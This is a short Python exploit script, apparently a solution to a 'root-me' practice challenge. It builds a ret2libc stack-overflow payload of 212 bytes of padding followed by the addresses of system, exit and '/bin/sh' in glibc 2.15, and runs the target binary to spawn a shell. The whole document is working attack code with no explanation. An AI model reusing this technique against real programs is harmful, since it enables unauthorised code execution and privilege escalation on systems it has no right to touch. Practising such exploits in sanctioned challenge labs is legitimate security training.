import struct
import subprocess

# Libc base address from gdb
libc_base = 0xb7e1d000

#Offsets for glibc 2.15 i386
system_offset = 0x3f0b0
exit_offset = 0x32be0
binsh_offset = 0x1638a0

system = libc_base + system_offset
exit_addr = libc_base + exit_offset
binsh = libc_base + binsh_offset

offset = 212
junk = b"A" * offset

#Payload: junk + system + exit + binsh
payload = junk + struct.pack("<I", system) + struct.pack("<I", exit_addr) + struct.pack("<I", binsh)


p = subprocess.Popen(["./root-me-2", payload])
p.communicate()
